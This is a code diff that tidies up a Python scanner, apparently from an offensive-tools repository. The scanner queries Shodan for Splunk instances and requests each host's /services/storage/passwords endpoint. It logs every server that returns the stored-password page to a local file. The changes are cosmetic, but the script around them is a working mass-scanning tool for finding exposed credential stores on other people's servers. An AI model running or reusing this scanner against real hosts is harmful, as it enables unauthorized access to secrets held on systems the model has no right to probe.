@@ -5,11 +5,10 @@
 #
 # Author: random_robbie
 
-import shodan
 import sys
-import re
+
+import shodan
 import requests
-from time import sleep
 from requests.auth import HTTPBasicAuth
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
@@ -21,13 +20,10 @@ FILE = "/services/storage/passwords"
 session = requests.Session()
 
 def filter_result(str):
-	str.strip() #trim
-	str.lstrip() #ltrim
-	str.rstrip() #rtrim
-	return str
+	return str.strip()
 
 def grab_file (IP,PORT,FILE,TITLE):
-	print ("[*] Testing: "+IP+" on Port: "+PORT+"[*]\n")
+	print("[*] Testing: "+IP+" on Port: "+PORT+"[*]\n")
 	try:
 		URL = "https://"+IP+":"+PORT+""+FILE+""
 		headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0"}
@@ -35,19 +31,17 @@ def grab_file (IP,PORT,FILE,TITLE):
 		result = response.text
 		if 'Unauthorized' not in result:
 			if "<title>passwords</title>" in result:
-				text_file = open("./cfg/splunk.cfg", "a")
-				text_file.write(""+URL+" - "+TITLE+"\n")
-				text_file.close()
-				print ("[*] Splunk... Found - "+TITLE+" [*]\n")
+				with open("./cfg/splunk.cfg", "a") as text_file:
+					text_file.write(""+URL+" - "+TITLE+"\n")
+				print("[*] Splunk... Found - "+TITLE+" [*]\n")
 		else:
 			print ("[*] Not Vulnerable [*]\n ")
 	except KeyboardInterrupt:
-		print ("Ctrl-c pressed ...")
-		sys.exit(1)
+		sys.exit("Ctrl-c pressed ...")
 			
 	except Exception as e:
-		print (e)
-		print ("[*] Nothing Found on IP: "+IP+" [*]\n")
+		print(e)
+		print("[*] Nothing Found on IP: "+IP+" [*]\n")
 	
 
 
@@ -69,9 +63,7 @@ try:
 				TITLE = service['title']
 				grab_file (IP,PORT,FILE,TITLE)
 except KeyboardInterrupt:
-		print ("Ctrl-c pressed ...")
-		sys.exit(1)
+		sys.exit("Ctrl-c pressed ...")
 				
 except Exception as e:
-		print('Error: %s' % e)
-		sys.exit(1)
+		sys.exit('Error: %s' % e)
